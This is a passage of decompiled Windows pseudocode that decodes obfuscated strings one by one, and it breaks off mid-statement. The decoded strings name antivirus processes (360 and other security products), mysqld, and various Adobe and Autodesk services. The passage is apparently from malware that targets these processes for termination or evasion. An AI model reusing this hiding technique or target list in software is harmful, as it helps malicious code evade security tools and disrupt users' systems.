*sub_401010((char *)&a13 + 1, 5) = 0;\n      STACK[0xAF0] = (unsigned int)sub_401000((char *)&a13 + 1);\n      LOBYTE(STACK[0x1C3]) = 114;\n      LOBYTE(STACK[0x1C4]) = sub_401120(&STACK[0x1C3], 51);\n      LOBYTE(STACK[0x1C5]) = sub_401120(&STACK[0x1C3], 54);\n      LOBYTE(STACK[0x1C6]) = sub_401120(&STACK[0x1C3], 48);\n      LOBYTE(STACK[0x1C7]) = sub_401120(&STACK[0x1C3], 100);\n      LOBYTE(STACK[0x1C8]) = sub_401120(&STACK[0x1C3], 111);\n      LOBYTE(STACK[0x1C9]) = sub_401120(&STACK[0x1C3], 99);\n      LOBYTE(STACK[0x1CA]) = sub_401120(&STACK[0x1C3], 116);\n      LOBYTE(STACK[0x1CB]) = sub_401120(&STACK[0x1C3], 111);\n      LOBYTE(STACK[0x1CC]) = sub_401120(&STACK[0x1C3], 114);\n      v286 = 0;\n      LOBYTE(STACK[0x1CD]) = 0;\n      do\n      {\n        v287 = sub_401010((char *)&STACK[0x1C4], v286);\n        LOBYTE(v287) = *v287;\n        TickCount = v287;\n        v288 = sub_401010((char *)&STACK[0x1C4], v286++);\n        *v288 = sub_401120(&STACK[0x1C3], (char)TickCount);\n      }\n      while ( v286 < 9 );\n      *sub_401010((char *)&STACK[0x1C4], 9) = 0;\n      STACK[0xAEC] = (unsigned int)sub_401000(&STACK[0x1C4]);\n      LOBYTE(STACK[0x1B8]) = 36;\n      LOBYTE(STACK[0x1B9]) = sub_401120(&STACK[0x1B8], 119);\n      LOBYTE(STACK[0x1BA]) = sub_401120(&STACK[0x1B8], 100);\n      LOBYTE(STACK[0x1BB]) = sub_401120(&STACK[0x1B8], 115);\n      LOBYTE(STACK[0x1BC]) = sub_401120(&STACK[0x1B8], 119);\n      LOBYTE(STACK[0x1BD]) = sub_401120(&STACK[0x1B8], 102);\n      LOBYTE(STACK[0x1BE]) = sub_401120(&STACK[0x1B8], 115);\n      LOBYTE(STACK[0x1BF]) = sub_401120(&STACK[0x1B8], 97);\n      LOBYTE(STACK[0x1C0]) = sub_401120(&STACK[0x1B8], 102);\n      LOBYTE(STACK[0x1C1]) = sub_401120(&STACK[0x1B8], 101);\n      v289 = 0;\n      LOBYTE(STACK[0x1C2]) = 0;\n      do\n      {\n        v290 = sub_401010((char *)&STACK[0x1B9], v289);\n        LOBYTE(v290) = *v290;\n        TickCount = v290;\n        v291 = sub_401010((char *)&STACK[0x1B9], v289++);\n        *v291 = sub_401120(&STACK[0x1B8], (char)TickCount);\n      }\n      while ( v289 < 9 );\n      *sub_401010((char *)&STACK[0x1B9], 9) = 0;\n      STACK[0xAE8] = (unsigned int)sub_401000(&STACK[0x1B9]);\n      LOBYTE(a49) = 102;\n      BYTE1(a49) = sub_401120(&a49, 102);\n      BYTE2(a49) = sub_401120(&a49, 100);\n      HIBYTE(a49) = sub_401120(&a49, 104);\n      LOBYTE(a50) = sub_401120(&a49, 111);\n      BYTE1(a50) = sub_401120(&a49, 115);\n      BYTE2(a50) = sub_401120(&a49, 116);\n      v292 = 0;\n      HIBYTE(a50) = 0;\n      do\n      {\n        v293 = sub_401010((char *)&a49 + 1, v292);\n        LOBYTE(v293) = *v293;\n        TickCount = v293;\n        v294 = sub_401010((char *)&a49 + 1, v292++);\n        *v294 = sub_401120(&a49, (char)TickCount);\n      }\n      while ( v292 < 6 );\n      *sub_401010((char *)&a49 + 1, 6) = 0;\n      STACK[0xAE4] = (unsigned int)sub_401000((char *)&a49 + 1);\n      LOBYTE(a45) = 118;\n      BYTE1(a45) = sub_401120(&a45, 71);\n      BYTE2(a45) = sub_401120(&a45, 68);\n      HIBYTE(a45) = sub_401120(&a45, 115);\n      LOBYTE(a46) = sub_401120(&a45, 99);\n      BYTE1(a46) = sub_401120(&a45, 97);\n      BYTE2(a46) = sub_401120(&a45, 110);\n      v295 = 0;\n      HIBYTE(a46) = 0;\n      do\n      {\n        v296 = sub_401010((char *)&a45 + 1, v295);\n        LOBYTE(v296) = *v296;\n        TickCount = v296;\n        v297 = sub_401010((char *)&a45 + 1, v295++);\n        *v297 = sub_401120(&a45, (char)TickCount);\n      }\n      while ( v295 < 6 );\n      *sub_401010((char *)&a45 + 1, 6) = 0;\n      STACK[0xAE0] = (unsigned int)sub_401000((char *)&a45 + 1);\n      LOBYTE(STACK[0x269]) = 8;\n      LOBYTE(STACK[0x26A]) = sub_401120(&STACK[0x269], 90);\n      LOBYTE(STACK[0x26B]) = sub_401120(&STACK[0x269], 104);\n      LOBYTE(STACK[0x26C]) = sub_401120(&STACK[0x269], 117);\n      LOBYTE(STACK[0x26D]) = sub_401120(&STACK[0x269], 68);\n      LOBYTE(STACK[0x26E]) = sub_401120(&STACK[0x269], 111);\n      LOBYTE(STACK[0x26F]) = sub_401120(&STACK[0x269], 110);\n      LOBYTE(STACK[0x270]) = sub_401120(&STACK[0x269], 103);\n      LOBYTE(STACK[0x271]) = sub_401120(&STACK[0x269], 70);\n      LOBYTE(STACK[0x272]) = sub_401120(&STACK[0x269], 97);\n      LOBYTE(STACK[0x273]) = sub_401120(&STACK[0x269], 110);\n      LOBYTE(STACK[0x274]) = sub_401120(&STACK[0x269], 103);\n      LOBYTE(STACK[0x275]) = sub_401120(&STACK[0x269], 89);\n      LOBYTE(STACK[0x276]) = sub_401120(&STACK[0x269], 117);\n      v298 = 0;\n      LOBYTE(STACK[0x277]) = 0;\n      do\n      {\n        v299 = sub_401010((char *)&STACK[0x26A], v298);\n        LOBYTE(v299) = *v299;\n        TickCount = v299;\n        v300 = sub_401010((char *)&STACK[0x26A], v298++);\n        *v300 = sub_401120(&STACK[0x269], (char)TickCount);\n      }\n      while ( v298 < 0xD );\n      *sub_401010((char *)&STACK[0x26A], 13) = 0;\n      STACK[0xB90] = (unsigned int)sub_401000(&STACK[0x26A]);\n      LOBYTE(STACK[0x148]) = 75;\n      LOBYTE(STACK[0x149]) = sub_401120(&STACK[0x148], 81);\n      LOBYTE(STACK[0x14A]) = sub_401120(&STACK[0x148], 66);\n      LOBYTE(STACK[0x14B]) = sub_401120(&STACK[0x148], 68);\n      LOBYTE(STACK[0x14C]) = sub_401120(&STACK[0x148], 66);\n      LOBYTE(STACK[0x14D]) = sub_401120(&STACK[0x148], 77);\n      LOBYTE(STACK[0x14E]) = sub_401120(&STACK[0x148], 103);\n      LOBYTE(STACK[0x14F]) = sub_401120(&STACK[0x148], 114);\n      LOBYTE(STACK[0x150]) = sub_401120(&STACK[0x148], 78);\n      v301 = 0;\n      LOBYTE(STACK[0x151]) = 0;\n      do\n      {\n        v302 = sub_401010((char *)&STACK[0x149], v301);\n        LOBYTE(v302) = *v302;\n        TickCount = v302;\n        v303 = sub_401010((char *)&STACK[0x149], v301++);\n        *v303 = sub_401120(&STACK[0x148], (char)TickCount);\n      }\n      while ( v301 < 8 );\n      *sub_401010((char *)&STACK[0x149], 8) = 0;\n      STACK[0xADC] = (unsigned int)sub_401000(&STACK[0x149]);\n      LOBYTE(a43) = 97;\n      BYTE1(a43) = sub_401120(&a43, 109);\n      BYTE2(a43) = sub_401120(&a43, 121);\n      HIBYTE(a43) = sub_401120(&a43, 115);\n      LOBYTE(a44) = sub_401120(&a43, 113);\n      BYTE1(a44) = sub_401120(&a43, 108);\n      BYTE2(a44) = sub_401120(&a43, 100);\n      v304 = 0;\n      HIBYTE(a44) = 0;\n      do\n      {\n        v305 = sub_401010((char *)&a43 + 1, v304);\n        LOBYTE(v305) = *v305;\n        TickCount = v305;\n        v306 = sub_401010((char *)&a43 + 1, v304++);\n        *v306 = sub_401120(&a43, (char)TickCount);\n      }\n      while ( v304 < 6 );\n      *sub_401010((char *)&a43 + 1, 6) = 0;\n      STACK[0xAD8] = (unsigned int)sub_401000((char *)&a43 + 1);\n      LOBYTE(STACK[0x310]) = 32;\n      LOBYTE(STACK[0x311]) = sub_401120(&STACK[0x310], 65);\n      LOBYTE(STACK[0x312]) = sub_401120(&STACK[0x310], 117);\n      LOBYTE(STACK[0x313]) = sub_401120(&STACK[0x310], 116);\n      LOBYTE(STACK[0x314]) = sub_401120(&STACK[0x310], 111);\n      LOBYTE(STACK[0x315]) = sub_401120(&STACK[0x310], 100);\n      LOBYTE(STACK[0x316]) = sub_401120(&STACK[0x310], 101);\n      LOBYTE(STACK[0x317]) = sub_401120(&STACK[0x310], 115);\n      LOBYTE(STACK[0x318]) = sub_401120(&STACK[0x310], 107);\n      LOBYTE(STACK[0x319]) = sub_401120(&STACK[0x310], 68);\n      LOBYTE(STACK[0x31A]) = sub_401120(&STACK[0x310], 101);\n      LOBYTE(STACK[0x31B]) = sub_401120(&STACK[0x310], 115);\n      LOBYTE(STACK[0x31C]) = sub_401120(&STACK[0x310], 107);\n      LOBYTE(STACK[0x31D]) = sub_401120(&STACK[0x310], 116);\n      LOBYTE(STACK[0x31E]) = sub_401120(&STACK[0x310], 111);\n      LOBYTE(STACK[0x31F]) = sub_401120(&STACK[0x310], 112);\n      LOBYTE(STACK[0x320]) = sub_401120(&STACK[0x310], 65);\n      LOBYTE(STACK[0x321]) = sub_401120(&STACK[0x310], 112);\n      LOBYTE(STACK[0x322]) = sub_401120(&STACK[0x310], 112);\n      LOBYTE(STACK[0x323]) = 0;\n      for ( i = 0; i < 0x12; ++i )\n      {\n        v308 = sub_401010((char *)&STACK[0x311], i);\n        LOBYTE(v308) = *v308;\n        TickCount = v308;\n        v309 = sub_401010((char *)&STACK[0x311], i);\n        *v309 = sub_401120(&STACK[0x310], (char)TickCount);\n      }\n      *sub_401010((char *)&STACK[0x311], 18) = 0;\n      STACK[0xAD4] = (unsigned int)sub_401000(&STACK[0x311]);\n      LOBYTE(STACK[0x25B]) = 31;\n      LOBYTE(STACK[0x25C]) = sub_401120(&STACK[0x25B], 97);\n      LOBYTE(STACK[0x25D]) = sub_401120(&STACK[0x25B], 99);\n      LOBYTE(STACK[0x25E]) = sub_401120(&STACK[0x25B], 119);\n      LOBYTE(STACK[0x25F]) = sub_401120(&STACK[0x25B], 101);\n      LOBYTE(STACK[0x260]) = sub_401120(&STACK[0x25B], 98);\n      LOBYTE(STACK[0x261]) = sub_401120(&STACK[0x25B], 98);\n      LOBYTE(STACK[0x262]) = sub_401120(&STACK[0x25B], 114);\n      LOBYTE(STACK[0x263]) = sub_401120(&STACK[0x25B], 111);\n      LOBYTE(STACK[0x264]) = sub_401120(&STACK[0x25B], 119);\n      LOBYTE(STACK[0x265]) = sub_401120(&STACK[0x25B], 115);\n      LOBYTE(STACK[0x266]) = sub_401120(&STACK[0x25B], 101);\n      LOBYTE(STACK[0x267]) = sub_401120(&STACK[0x25B], 114);\n      v310 = 0;\n      LOBYTE(STACK[0x268]) = 0;\n      do\n      {\n        v311 = sub_401010((char *)&STACK[0x25C], v310);\n        LOBYTE(v311) = *v311;\n        TickCount = v311;\n        v312 = sub_401010((char *)&STACK[0x25C], v310++);\n        *v312 = sub_401120(&STACK[0x25B], (char)TickCount);\n      }\n      while ( v310 < 0xC );\n      *sub_401010((char *)&STACK[0x25C], 12) = 0;\n      STACK[0xAD0] = (unsigned int)sub_401000(&STACK[0x25C]);\n      LOBYTE(STACK[0x2A7]) = 27;\n      LOBYTE(STACK[0x2A8]) = sub_401120(&STACK[0x2A7], 67);\n      LOBYTE(STACK[0x2A9]) = sub_401120(&STACK[0x2A7], 114);\n      LOBYTE(STACK[0x2AA]) = sub_401120(&STACK[0x2A7], 101);\n      LOBYTE(STACK[0x2AB]) = sub_401120(&STACK[0x2A7], 97);\n      LOBYTE(STACK[0x2AC]) = sub_401120(&STACK[0x2A7], 116);\n      LOBYTE(STACK[0x2AD]) = sub_401120(&STACK[0x2A7], 105);\n      LOBYTE(STACK[0x2AE]) = sub_401120(&STACK[0x2A7], 118);\n      LOBYTE(STACK[0x2AF]) = sub_401120(&STACK[0x2A7], 101);\n      LOBYTE(STACK[0x2B0]) = sub_401120(&STACK[0x2A7], 32);\n      LOBYTE(STACK[0x2B1]) = sub_401120(&STACK[0x2A7], 67);\n      LOBYTE(STACK[0x2B2]) = sub_401120(&STACK[0x2A7], 108);\n      LOBYTE(STACK[0x2B3]) = sub_401120(&STACK[0x2A7], 111);\n      LOBYTE(STACK[0x2B4]) = sub_401120(&STACK[0x2A7], 117);\n      LOBYTE(STACK[0x2B5]) = sub_401120(&STACK[0x2A7], 100);\n      v313 = 0;\n      LOBYTE(STACK[0x2B6]) = 0;\n      do\n      {\n        v314 = sub_401010((char *)&STACK[0x2A8], v313);\n        LOBYTE(v314) = *v314;\n        TickCount = v314;\n        v315 = sub_401010((char *)&STACK[0x2A8], v313++);\n        *v315 = sub_401120(&STACK[0x2A7], (char)TickCount);\n      }\n      while ( v313 < 0xE );\n      *sub_401010((char *)&STACK[0x2A8], 14) = 0;\n      STACK[0xACC] = (unsigned int)sub_401000(&STACK[0x2A8]);\n      LOBYTE(STACK[0x362]) = 113;\n      LOBYTE(STACK[0x363]) = sub_401120(&STACK[0x362], 65);\n      LOBYTE(STACK[0x364]) = sub_401120(&STACK[0x362], 100);\n      LOBYTE(STACK[0x365]) = sub_401120(&STACK[0x362], 111);\n      LOBYTE(STACK[0x366]) = sub_401120(&STACK[0x362], 98);\n      LOBYTE(STACK[0x367]) = sub_401120(&STACK[0x362], 101);\n      LOBYTE(STACK[0x368]) = sub_401120(&STACK[0x362], 32);\n      LOBYTE(STACK[0x369]) = sub_401120(&STACK[0x362], 68);\n      LOBYTE(STACK[0x36A]) = sub_401120(&STACK[0x362], 101);\n      LOBYTE(STACK[0x36B]) = sub_401120(&STACK[0x362], 115);\n      LOBYTE(STACK[0x36C]) = sub_401120(&STACK[0x362], 107);\n      LOBYTE(STACK[0x36D]) = sub_401120(&STACK[0x362], 116);\n      LOBYTE(STACK[0x36E]) = sub_401120(&STACK[0x362], 111);\n      LOBYTE(STACK[0x36F]) = sub_401120(&STACK[0x362], 112);\n      LOBYTE(STACK[0x370]) = sub_401120(&STACK[0x362], 32);\n      LOBYTE(STACK[0x371]) = sub_401120(&STACK[0x362], 83);\n      LOBYTE(STACK[0x372]) = sub_401120(&STACK[0x362], 101);\n      LOBYTE(STACK[0x373]) = sub_401120(&STACK[0x362], 114);\n      LOBYTE(STACK[0x374]) = sub_401120(&STACK[0x362], 118);\n      LOBYTE(STACK[0x375]) = sub_401120(&STACK[0x362], 105);\n      LOBYTE(STACK[0x376]) = sub_401120(&STACK[0x362], 99);\n      LOBYTE(STACK[0x377]) = sub_401120(&STACK[0x362], 101);\n      v316 = 0;\n      LOBYTE(STACK[0x378]) = 0;\n      do\n      {\n        v317 = sub_401010((char *)&STACK[0x363], v316);\n        LOBYTE(v317) = *v317;\n        TickCount = v317;\n        v318 = sub_401010((char *)&STACK[0x363], v316++);\n        *v318 = sub_401120(&STACK[0x362], (char)TickCount);\n      }\n      while ( v316 < 0x15 );\n      *sub_401010((char *)&STACK[0x363], 21) = 0;\n      STACK[0xAC8] = (unsigned int)sub_401000(&STACK[0x363]);\n      LOBYTE(STACK[0x152]) = 118;\n      LOBYTE(STACK[0x153]) = sub_401120(&STACK[0x152], 67);\n      LOBYTE(STACK[0x154]) = sub_401120(&STACK[0x152], 111);\n      LOBYTE(STACK[0x155]) = sub_401120(&STACK[0x152], 114);\n      LOBYTE(STACK[0x156]) = sub_401120(&STACK[0x152], 101);\n      LOBYTE(STACK[0x157]) = sub_401120(&STACK[0x152], 83);\n      LOBYTE(STACK[0x158]) = sub_401120(&STACK[0x152], 121);\n      LOBYTE(STACK[0x159]) = sub_401120(&STACK[0x152], 110);\n      LOBYTE(STACK[0x15A]) = sub_401120(&STACK[0x152], 99);\n      v319 = 0;\n      LOBYTE(STACK[0x15B]) = 0;\n      do\n      {\n        v320 = sub_401010((char *)&STACK[0x153], v319);\n        LOBYTE(v320) = *v320;\n        TickCount = v320;\n        v321 = sub_401010((char *)&STACK[0x153], v319++);\n        *v321 = sub_401120(&STACK[0x152], (char)TickCount);\n      }\n      while ( v319 < 8 );\n      *sub_401010((char *)&STACK[0x153], 8) = 0;\n      STACK[0xAC4] = (unsigned int)sub_401000(&STACK[0x153]);\n      LOBYTE(STACK[0x2FE]) = 115;\n      LOBYTE(STACK[0x2FF]) = sub_401120(&STACK[0x2FE], 65);\n      LOBYTE(STACK[0x300]) = sub_401120(&STACK[0x2FE], 100);\n      LOBYTE(STACK[0x301]) = sub_401120(&STACK[0x2FE], 111);\n      LOBYTE(STACK[0x302]) = sub_401120(&STACK[0x2FE], 98);\n      LOBYTE(STACK[0x303]) = sub_401120(&STACK[0x2FE], 101);\n      LOBYTE(STACK[0x304]) = sub_401120(&STACK[0x2FE], 32);\n      LOBYTE(STACK[0x305]) = sub_401120(&STACK[0x2FE], 67);\n      LOBYTE(STACK[0x306]) = sub_401120(&STACK[0x2FE], 69);\n      LOBYTE(STACK[0x307]) = sub_401120(&STACK[0x2FE], 70);\n      LOBYTE(STACK[0x308]) = sub_401120(&STACK[0x2FE], 32);\n      LOBYTE(STACK[0x309]) = sub_401120(&STACK[0x2FE], 72);\n      LOBYTE(STACK[0x30A]) = sub_401120(&STACK[0x2FE], 101);\n      LOBYTE(STACK[0x30B]) = sub_401120(&STACK[0x2FE], 108);\n      LOBYTE(STACK[0x30C]) = sub_401120(&STACK[0x2FE], 112);\n      LOBYTE(STACK[0x30D]) = sub_401120(&STACK[0x2FE], 101);\n      LOBYTE(STACK[0x30E]) = sub_401120(&STACK[0x2FE], 114);\n      v322 = 0;\n      LOBYTE(STACK[0x30F]) = 0;\n      do\n      {\n        v323 = sub_401010((char *)&STACK[0x2FF], v322);\n        LOBYTE(v323) = *v323;\n        TickCount = v323;\n        v324 = sub_401010((char *)&STACK[0x2FF], v322++);\n        *v324 = sub_401120(&STACK[0x2FE], (char)TickCount);\n      }\n      while ( v322 < 0x10 );\n      *sub_401010((char *)&STACK[0x2FF], 16) = 0;\n      STACK[0xAC0] = (unsigned int)sub_401000(&STACK[0x2FF]);\n      HIBYTE(a9) = 48;\n      LOBYTE(a10) = sub_401120((_BYTE *)&a9 + 3, 110);\n      BYTE1(a10) = sub_401120((_BYTE *)&a9 + 3, 111);\n      BYTE2(a10) = sub_401120((_BYTE *)&a9 + 3, 100);\n      HIBYTE(a10) = sub_401120((_BYTE *)&a9 + 3, 101);\n      v325 = 0;\n      LOBYTE(a11) = 0;\n      do\n      {\n        v326 = sub_401010((char *)&a10, v325);\n        LOBYTE(v326) = *v326;\n        TickCount = v326;\n        v327 = sub_401010((char *)&a10, v325++);\n        *v327 = sub_401120((_BYTE *)&a9 + 3, (char)TickCount);\n      }\n      while ( v325 < 4 );\n      *sub_401010((char *)&a10, 4) = 0;\n      STACK[0xABC] = (unsigned int)sub_401000(&a10);\n      LOBYTE(STACK[0x297]) = 26;\n      LOBYTE(STACK[0x298]) = sub_401120(&STACK[0x297], 65);\n      LOBYTE(STACK[0x299]) = sub_401120(&STACK[0x297], 100);\n      LOBYTE(STACK[0x29A]) = sub_401120(&STACK[0x297], 111);\n      LOBYTE(STACK[0x29B]) = sub_401120(&STACK[0x297], 98);\n      LOBYTE(STACK[0x29C]) = sub_401120(&STACK[0x297], 101);\n      LOBYTE(STACK[0x29D]) = sub_401120(&STACK[0x297], 73);\n      LOBYTE(STACK[0x29E]) = sub_401120(&STACK[0x297], 80);\n      LOBYTE(STACK[0x29F]) = sub_401120(&STACK[0x297], 67);\n      LOBYTE(STACK[0x2A0]) = sub_401120(&STACK[0x297], 66);\n      LOBYTE(STACK[0x2A1]) = sub_401120(&STACK[0x297], 114);\n      LOBYTE(STACK[0x2A2]) = sub_401120(&STACK[0x297], 111);\n      LOBYTE(STACK[0x2A3]) = sub_401120(&STACK[0x297], 107);\n      LOBYTE(STACK[0x2A4]) = sub_401120(&STACK[0x297], 101);\n      LOBYTE(STACK[0x2A5]) = sub_401120(&STACK[0x297], 114);\n      v328 = 0;\n      LOBYTE(STACK[0x2A6]) = 0;\n      do\n      {\n        v329 = sub_401010((char *)&STACK[0x298], v328);\n        LOBYTE(v329) = *v329;\n        TickCount = v329;\n        v330 = sub_401010((char *)&STACK[0x298], v328++);\n        *v330 = sub_401120(&STACK[0x297], (char)TickCount);\n      }\n      while ( v328 < 0xE );\n      *sub_401010((char *)&STACK[0x298], 14) = 0;\n      STACK[0xAB8] = (unsigned int)sub_401000(&STACK[0x298]);\n      LOBYTE(STACK[0x24D]) = 118;\n      LOBYTE(STACK[0x24E]) = sub_401120(&STACK[0x24D], 115);\n      LOBYTE(STACK[0x24F]) = sub_401120(&STACK[0x24D], 121);\n      LOBYTE(STACK[0x250]) = sub_401120(&STACK[0x24D], 110);\n      LOBYTE(STACK[0x251]) = sub_401120(&STACK[0x24D], 99);\n      LOBYTE(STACK[0x252]) = sub_401120(&STACK[0x24D], 45);\n      LOBYTE(STACK[0x253]) = sub_401120(&STACK[0x24D], 116);\n      LOBYTE(STACK[0x254]) = sub_401120(&STACK[0x24D], 97);\n      LOBYTE(STACK[0x255]) = sub_401120(&STACK[0x24D], 115);\n      LOBYTE(STACK[0x256]) = sub_401120(&STACK[0x24D], 107);\n      LOBYTE(STACK[0x257]) = sub_401120(&STACK[0x24D], 98);\n      LOBYTE(STACK[0x258]) = sub_401120(&STACK[0x24D], 97);\n      LOBYTE(STACK[0x259]) = sub_401120(&STACK[0x24D], 114);\n      v331 = 0;\n      LOBYTE(STACK[0x25A]) = 0;\n      do\n      {\n        v332 = sub_401010((char *)&STACK[0x24E], v331);\n        LOBYTE(v332) = *v332;\n        TickCount = v332;\n        v333 = sub_401010((char *)&STACK[0x24E], v331++);\n        *v333 = sub_401120(&STACK[0x24D], (char)TickCount);\n      }\n      while ( v331 < 0xC );\n      *sub_401010((char *)&STACK[0x24E], 12) = 0;\n      STACK[0xAB4] = (unsigned int)sub_401000(&STACK[0x24E]);\n      LOBYTE(STACK[0x225]) = 110;\n      LOBYTE(STACK[0x226]) = sub_401120(&STACK[0x225], 115);\n      LOBYTE(STACK[0x227]) = sub_401120(&STACK[0x225], 121);\n      LOBYTE(STACK[0x228]) = sub_401120(&STACK[0x225], 110);\n      LOBYTE(STACK[0x229]) = sub_401120(&STACK[0x225], 99);\n      LOBYTE(STACK[0x22A]) = sub_401120(&STACK[0x225], 45);\n      LOBYTE(STACK[0x22B]) = sub_401120(&STACK[0x225], 119);\n      LOBYTE(STACK[0x22C]) = sub_401120(&STACK[0x225], 111);\n      LOBYTE(STACK[0x22D]) = sub_401120(&STACK[0x225], 114);\n      LOBYTE(STACK[0x22E]) = sub_401120(&STACK[0x225], 107);\n      LOBYTE(STACK[0x22F]) = sub_401120(&STACK[0x225], 101);\n      LOBYTE(STACK[0x230]) = sub_401120(&STACK[0x225], 114);\n      v334 = 0;\n      LOBYTE(STACK[0x231]) = 0;\n      do\n      {\n        v335 = sub_401010((char *)&STACK[0x226], v334);\n        LOBYTE(v335) = *v335;\n        TickCount = v335;\n        v336 = sub_401010((char *)&STACK[0x226], v334++);\n        *v336 = sub_401120(&STACK[0x225], (char)TickCount);\n      }\n      while ( v334 < 0xB );\n      *sub_401010((char *)&STACK[0x226], 11) = 0;\n      STACK[0xAB0] = (unsigned int)sub_401000(&STACK[0x226]);\n      LOBYTE(STACK[0x34C]) = 17;\n      LOBYTE(STACK[0x34D]) = sub_401120(&STACK[0x34C], 73);\n      LOBYTE(STACK[0x34E]) = sub_401120(&STACK[0x34C], 110);\n      LOBYTE(STACK[0x34F]) = sub_401120(&STACK[0x34C], 112);\n      LOBYTE(STACK[0x350]) = sub_401120(&STACK[0x34C], 117);\n      LOBYTE(STACK[0x351]) = sub_401120(&STACK[0x34C], 116);\n      LOBYTE(STACK[0x352]) = sub_401120(&STACK[0x34C], 80);\n      LOBYTE(STACK[0x353]) = sub_401120(&STACK[0x34C], 101);\n      LOBYTE(STACK[0x354]) = sub_401120(&STACK[0x34C], 114);\n      LOBYTE(STACK[0x355]) = sub_401120(&STACK[0x34C], 115);\n      LOBYTE(STACK[0x356]) = sub_401120(&STACK[0x34C], 111);\n      LOBYTE(STACK[0x357]) = sub_401120(&STACK[0x34C], 110);\n      LOBYTE(STACK[0x358]) = sub_401120(&STACK[0x34C], 97);\n      LOBYTE(STACK[0x359]) = sub_401120(&STACK[0x34C], 108);\n      LOBYTE(STACK[0x35A]) = sub_401120(&STACK[0x34C], 105);\n      LOBYTE(STACK[0x35B]) = sub_401120(&STACK[0x34C], 122);\n      LOBYTE(STACK[0x35C]) = sub_401120(&STACK[0x34C], 97);\n      LOBYTE(STACK[0x35D]) = sub_401120(&STACK[0x34C], 116);\n      LOBYTE(STACK[0x35E]) = sub_401120(&STACK[0x34C], 105);\n      LOBYTE(STACK[0x35F]) = sub_401120(&STACK[0x34C], 111);\n      LOBYTE(STACK[0x360]) = sub_401120(&STACK[0x34C], 110);\n      v337 = 0;\n      LOBYTE(STACK[0x361]) = 0;\n      do\n      {\n        v338 = sub_401010((char *)&STACK[0x34D], v337);\n        LOBYTE(v338) = *v338;\n        TickCount = v338;\n        v339 = sub_401010((char *)&STACK[0x34D], v337++);\n        *v339 = sub_401120(&STACK[0x34C], (char)TickCount);\n      }\n      while ( v337 < 0x14 );\n      *sub_401010((char *)&STACK[0x34D], 20) = 0;\n      STACK[0xB1C] = (unsigned int)sub_401000(&STACK[0x34D]);\n      LOBYTE(STACK[0x2B7]) = 115;\n      LOBYTE(STACK[0x2B8]) = sub_401120(&STACK[0x2B7], 65);\n      LOBYTE(STACK[0x2B9]) = sub_401120(&STACK[0x2B7], 100);\n      LOBYTE(STACK[0x2BA]) = sub_401120(&STACK[0x2B7], 111);\n      LOBYTE(STACK[0x2BB]) = sub_401120(&STACK[0x2B7], 98);\n      LOBYTE(STACK[0x2BC]) = sub_401120(&STACK[0x2B7], 101);\n      LOBYTE(STACK[0x2BD]) = sub_401120(&STACK[0x2B7], 67);\n      LOBYTE(STACK[0x2BE]) = sub_401120(&STACK[0x2B7], 111);\n      LOBYTE(STACK[0x2BF]) = sub_401120(&STACK[0x2B7], 108);\n      LOBYTE(STACK[0x2C0]) = sub_401120(&STACK[0x2B7], 108);\n      LOBYTE(STACK[0x2C1]) = sub_401120(&STACK[0x2B7], 97);\n      LOBYTE(STACK[0x2C2]) = sub_401120(&STACK[0x2B7], 98);\n      LOBYTE(STACK[0x2C3]) = sub_401120(&STACK[0x2B7], 83);\n      LOBYTE(STACK[0x2C4]) = sub_401120(&STACK[0x2B7], 121);\n      LOBYTE(STACK[0x2C5]) = sub_401120(&STACK[0x2B7], 110);\n      LOBYTE(STACK[0x2C6]) = sub_401120(&STACK[0x2B7], 99);\n      v340 = 0;\n      LOBYTE(STACK[0x2C7]) = 0;\n      do\n      {\n        v341 = sub_401010((char *)&STACK[0x2B8], v340);\n        LOBYTE(v341) = *v341;\n        TickCount = v341;\n        v342 = sub_401010((char *)&STACK[0x2B8], v340++);\n        *v342 = sub_401120(&STACK[0x2B7], (char)TickCount);\n      }\n      while ( v340 < 0xF );\n      *sub_401010((char *)&STACK[0x2B8], 15) = 0;\n      STACK[0xB18] = (unsigned int)sub_401000(&STACK[0x2B8]);\n      LOBYTE(STACK[0x1F2]) = 88;\n      LOBYTE(STACK[0x1F3]) = sub_401120(&STACK[0x1F2], 66);\n      LOBYTE(STACK[0x1F4]) = sub_401120(&STACK[0x1F2], 114);\n      LOBYTE(STACK[0x1F5]) = sub_401120(&STACK[0x1F2], 67);\n      LOBYTE(STACK[0x1F6]) = sub_401120(&STACK[0x1F2], 116);\n      LOBYTE(STACK[0x1F7]) = sub_401120(&STACK[0x1F2], 114);\n      LOBYTE(STACK[0x1F8]) = sub_401120(&STACK[0x1F2], 108);\n      LOBYTE(STACK[0x1F9]) = sub_401120(&STACK[0x1F2], 67);\n      LOBYTE(STACK[0x1FA]) = sub_401120(&STACK[0x1F2], 110);\n      LOBYTE(STACK[0x1FB]) = sub_401120(&STACK[0x1F2], 116);\n      LOBYTE(STACK[0x1FC]) = sub_401120(&STACK[0x1F2], 114);\n      v343 = 0;\n      LOBYTE(STACK[0x1FD]) = 0;\n      do\n      {\n        v344 = sub_401010((char *)&STACK[0x1F3], v343);\n        LOBYTE(v344) = *v344;\n        TickCount = v344;\n        v345 = sub_401010((char *)&STACK[0x1F3], v343++);\n        *v345 = sub_401120(&STACK[0x1F2], (char)TickCount);\n      }\n      while ( v343 < 0xA );\n      *sub_401010((char *)&STACK[0x1F3], 10) = 0;\n      STACK[0xC10] = (unsigned int)sub_401000(&STACK[0x1F3]);\n      LOBYTE(STACK[0x1AD]) = 59;\n      LOBYTE(STACK[0x1AE]) = sub_401120(&STACK[0x1AD], 66);\n      LOBYTE(STACK[0x1AF]) = sub_401120(&STACK[0x1AD], 114);\n      LOBYTE(STACK[0x1B0]) = sub_401120(&STACK[0x1AD], 67);\n      LOBYTE(STACK[0x1B1]) = sub_401120(&STACK[0x1AD], 99);\n      LOBYTE(STACK[0x1B2]) = sub_401120(&STACK[0x1AD], 85);\n      LOBYTE(STACK[0x1B3]) = sub_401120(&STACK[0x1AD], 120);\n      LOBYTE(STACK[0x1B4]) = sub_401120(&STACK[0x1AD], 83);\n      LOBYTE(STACK[0x1B5]) = sub_401120(&STACK[0x1AD], 121);\n      LOBYTE(STACK[0x1B6]) = sub_401120(&STACK[0x1AD], 115);\n      v346 = 0;\n      LOBYTE(STACK[0x1B7]) = 0;\n      do\n      {\n        v347 = sub_401010((char *)&STACK[0x1AE], v346);\n        LOBYTE(v347) = *v347;\n        TickCount = v347;\n        v348 = sub_401010((char *)&STACK[0x1AE], v346++);\n        *v348 = sub_401120(&STACK[0x1AD], (char)TickCount);\n      }\n      while ( v346 < 9 );\n      *sub_401010((char *)&STACK[0x1AE], 9) = 0;\n      STACK[0xC0C] = 